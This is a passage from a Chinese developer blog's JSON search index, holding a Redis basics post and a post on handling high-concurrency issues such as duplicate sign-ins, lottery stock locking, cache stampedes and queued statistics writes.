","date":"2016-04-03","objectID":"/posts/2016-04-04-safe/:6:0","tags":["安全","脚本注入","XSS","CSRF","HTTP劫持","DDOS"],"title":"大话WEB安全","uri":"/posts/2016-04-04-safe/"},{"categories":["Redis"],"content":" content {:toc} 前期多做功课，摆对正确姿势去使用 redis 可以加快请求数据的响应时间，然而噬无忌惮的使用会让你为内存问题而烦恼，从长远的角度看这个不仅仅是只要加几条内存就能解决的问题 redis： redis 是 Key Value nosql 数据库，数据存储在内存中，单进程，自己实现了一套异步事件处理，虽然单进程但是数据库处理很快，异步持久化； 持久化方式：RDB(数据快照)，AOF(日志追加的方式)进行异步持久化 支持集群 ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:0:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":"radis 有五种的数据类型： string 字符串类型 字符串类型是 redis 中的最基本的数据类型，也是其他 4 种数据类型的基础，它能存储任何形式的字符串，包括二进制数据 hash 哈希表类型 哈希类型是一个字符串类型的字段和字段值的映射表。哈希类型适合存储对象。相较于将对象每一个字段存成当个字符串类型，将一个对象存成在 hash 类型会占用更少的内存，并且可以更方便的存取整个对象 list 链表类型 链表类型可以存储一个有序的字符串列表，内部是使用双向链表实现的。所以我们通常用链表类型的 LPUSH 和 LPOP 或者 RPUSH 和 RPOP 实现栈的功能，用 LPUSH 和 RPOP 或者 RPUSH 和 LPOP 实现队列的功能 set 无序集合类型 集合类型和数学中集合概念相似，比如集合中的元素是唯一的，无序的，集合与集合之间可以进行交并差等操作 zset 有序集合类型 有序集合类型和集合类型一样，只不过多了一个“有序”，有序集合中每一个元素都关联了一个分数，虽然集合中每一个元素都不同的，但是他们的分数却可以相同 ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:1:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":"注意： redis 的数据都是存储在内存里的； 2.0 以上好像是可以开启 VM 虚拟内存(把磁盘分配部分作为虚拟内存)的功能，通过内部机制把冷数据放到虚拟内存里，常用的数据还是在内存中； redis 只能是作为热数据(经常被并发查询的)的缓存，不能把 redis 当成数据库去使用 ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:2:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":"内存控制与优化： 存储的数据的控制： 控制数据字段(序列化对象的时候不用的字段不要读到 redis，减少存储数据量) 设置过期时间 热数据存储(冷数据过滤移除，或者不存) 不存储长期累加增长的数据，尤其是可能成为大数据的，(可以考虑使用 mongodb) ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:3:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":"redis 其他辅助： 查看配置：config get * http://blog.csdn.net/lengzijian/article/details/8593656 查看信息：info http://www.runoob.com/redis/server-info.html 其他命令： http://www.runoob.com/redis/redis-commands.html ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:4:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":".NET 类库： 正在使用版本：ServiceStack.Redis 3.9.71.0，\u003e=4.0 版本有限制连接池的数量，需要收费 StackExchange.Redis 下载：http://download.csdn.net/detail/shi1984/8916095#comment 博客： http://www.cnblogs.com/bnbqian/p/4962855.html github： https://github.com/StackExchange/StackExchange.Redis ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:5:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":"当前我们的应用场景： STRING 存储信息对象序列化 JSON 格式 HASH： 经常被并发请求的小数据查询，如：最近五日的超高返商品数据，存储在 Hash 中，field=商品 ID，value=商品信息(对象序列化 JSON 格式) LIST： 作为信息队列使用，不断的 Lpush 数据到 List 中，rpop 数据出来入库，或者处理。 ZSET： 排序列表，如搜索关键字排名 SET 相对比较少去使用 ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:6:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["Redis"],"content":"总结： 前期多做功课，摆对正确姿势去使用 redis 可以加快请求数据的响应时间，然而噬无忌惮的使用会让你为内存问题而烦恼，从长远的角度看这个不仅仅是只要加几条内存就能解决的问题 ","date":"2016-04-01","objectID":"/posts/2016-04-02-redis/:7:0","tags":["Redis"],"title":"大话Redis基础","uri":"/posts/2016-04-02-redis/"},{"categories":["高并发"],"content":"高并发是指在同一个时间点，有很多用户同时的访问 URL 地址，比如：淘宝的双 11，双 12，就会产生高并发,如贴吧的爆吧，就是恶意的高并发请求，也就是 DDOS 攻击，再屌丝点的说法就像玩撸啊撸被 ADC 暴击了一样,那伤害你懂得(如果你看懂了，这个说法说明是正在奔向人生巅峰的屌丝。 高并发会来带的后果 服务端： 导致站点服务器/DB 服务器资源被占满崩溃，数据的存储和更新结果和理想的设计是不一样的，比如：出现重复的数据记录，多次添加了用户积分等。 用户角度： 尼玛，这么卡，老子来参加活动的，刷新了还是这样，垃圾网站，再也不来了。 我的经历： 在做公司产品网站的过程中，经常会有这样的需求，比如什么搞个活动专题，抽奖，签到，搞个积分竞拍等等，如果没有考虑到高并发下的数据处理，那就 Game Over 了，很容易导致抽奖被多抽走，签到会发现一个用户有多条记录，签到一次获得了获得了多积分，等等，各种超出正常逻辑的现象，这就是做产品网站必须考虑的问题，因为这些都是面向大量用户的，而不是像做 ERP 管理系统，OA 系统那样，只是面向员工。 下面我进行实例分析，简单粗暴，动态分析，纯属本人个人经验分享，如有说错，或者有更好的建议或者意见的请留言，大家一起成长。 并发下的数据处理： 通过表设计,如：记录表添加唯一约束，数据处理逻辑使用事物防止并发下的数据错乱问题 通过服务端锁进程防止包并发下的数据错乱问题 这里主要讲述的是在并发请求下的数据逻辑处理的接口,如何保证数据的一致性和完整性，这里的并发可能是大量用户发起的，也可能攻击者通过并发工具发起的并发请求 如例子：通过表设计防止并发导致数据错乱 需求点 【签到功能】 一天一个用户只能签到一次， 签到成功后用户获取到一个积分 已知表 用户表，包含积分字段 高并发意淫分析(属于开发前的猜测)： 在高并发的情况下，会导致，一个用户签到记录会有多条，或者用户签到后不止加一积分。 我的设计 首先根据需求我会添加一张签到记录表，重点来了，这张表需要把用户唯一标识字段(ID,Token)和签到日期字段添加为唯一约束，或者唯一索引，这样就可以防止并发的时候插入重复用户的签到记录。然后再程序代码逻辑里，先执行签到数据的添加(这里可以防止并发，添加成功后再进行积分的添加，这样就可以防止重复的添加积分了。最后我还是建议所有的数据操作都写在一个 sql 事务里面， 这样在添加失败，或者编辑用户积分失败的时候可以回滚数据。 如例子 2（事务+通过更新锁 防止并发导致数据错乱 或者事物+Update 的锁表机制） 需求点： 【抽奖功能】 抽奖一次消耗一个积分 抽奖中奖后编辑剩余奖品总数 剩余奖品总数为 0，或者用户积分为 0 的时候无法进行抽奖 已知表: 用户表，包含积分字段 奖品表，包含奖品剩余数量字段 高并发意淫分析(属于开发前的猜测): 在高并发的情况下，会导致用户参与抽奖的时候积分被扣除，而奖品实际上已经被抽完了 我的设计: 在事物里，通过 WITH (UPDLOCK) 锁住商品表，或者 Update 表的奖品剩余数量和最后编辑时间字段，来把数据行锁住，然后进行用户积分的消耗，都完成后提交事物，失败就回滚。 这样就可以保证，只有可能存在一个操作在操作这件商品的数量，只有等到这个操作事物提交后，其他的操作这个商品行的事物才会继续执行。 如例子 3（通过程序代码防止包并发下的数据错乱问题） 需求点： 【缓存数据到 cache 里】， 当缓存不存在的时候，从数据库中获取并保存在 cache 里，如果存在从 cache 里获取，每天 10 点必须更新一次，其他时间点缓存两个小时更新一次 到 10 点的时候，凡是打开页面的用户会自动刷新页面 问题点： 这里有个逻辑用户触发缓存的更新，用户刷新页面，当缓存存在的时候，会取到最后一次缓存更新时间，如果当前时间大于十点，并且最后缓存时间是 10 点前，则会从数据库中重新获取数据保存到 cache 中。 还有客户端页面会在 10 点时候用 js 发起页面的刷新，就是因为有这样的逻辑，导致 10 点的时候有很多并发请求同时过来，然后就会导致很多的 sql 查询操作，理想的逻辑是，只有一个请求会去数据库获取，其他都是从缓存中获取数据。(因为这个 sql 查询很耗服务器性能，所以导致在 10 点的时候，突然间数据库服务器压力暴增) 解决问题： C#通过 （锁）lock，在从数据读取到缓存的那段代码前面加上锁，这样在并发的情况下只会有一个请求是从数据库里获取数据，其他都是从缓存中获取。 访问量大的数据统计接口 需求： 用户行为数据统计接口，用来记录商品展示次数，用户通过点击图片，或者链接，或者其他方式进入到商品详情的行为次数 问题点： 这接口是给前端 ajax 使用，访问量会很大，一页面展示的时候就会有几十件商品的展示，滚动条滚到到页面显示商品的时候就会请求接口进行展示数据的统计，每次翻页又会加载几十件 意淫分析： 设想如果同时有 1W 个用户同时在线访问页面，一个次拉动滚动条屏幕页面展示 10 件商品，这样就会有 10W 个请求过来，服务端需要把请求数据入库。在实际线上环境可能还会超过这个请求量，如果不经过进行高并发设计处理，服务器分分钟给跪了。 解决问题： 我们通过 nodejs 写了一个数据处理接口，把统计数据先存到 redis 的 list 里。(使用 nodejs 写接口的好处是，nodejs 使用单线程异步事件机制，高并发处理能力强，不会因为数据逻辑处理问题导致服务器资源被占用而导致服务器宕机) 然后再使用 nodejs 写了一个脚本，脚本功能就是从 redis 里出列数据保存到 mysql 数据库中。这个脚本会一直运行，当 redis 没有数据需要同步到数据库中的时候，sleep，让在进行数据同步操作 高并发的下的服务器压力均衡，合理站点架设，DB 部署 以下我所知道的： 服务器代理 nginx，做服务器的均衡负载，把压力均衡到多台服务器 部署集群 mysql 数据库， redis 服务器，或者 mongodb 服务器，把一些常用的查询数据，并且不会经常的变化的数据保存到其他 nosql DB 服务器中，来减少数据库服务器的压力，加快数据的响应速度。 数据缓存，Cache 在高并发接口的设计中可以使用具有高并发能力的编程语言去开发，如：nodejs 做 web 接口 服务器部署，图片服务器分离，静态文件走 CDN DBA 数据库的优化查询条件，索引优化 消息存储机制，将数据添加到信息队列中(redis list)，然后再写工具去入库 脚本合理控制请求，如，防止用户重复点击导致的 ajax 多余的请求，等等。 并发测试神器推荐 Apache JMeter Microsoft Web Application Stress Tool Visual Studio 性能负载 ","date":"2016-04-01","objectID":"/posts/2016-04-01-high-concurrency/:0:0","tags":["高并发"],"title":"大话程序猿眼里的高并发","uri":"/posts/2016-04-01-high-concurrency/"}]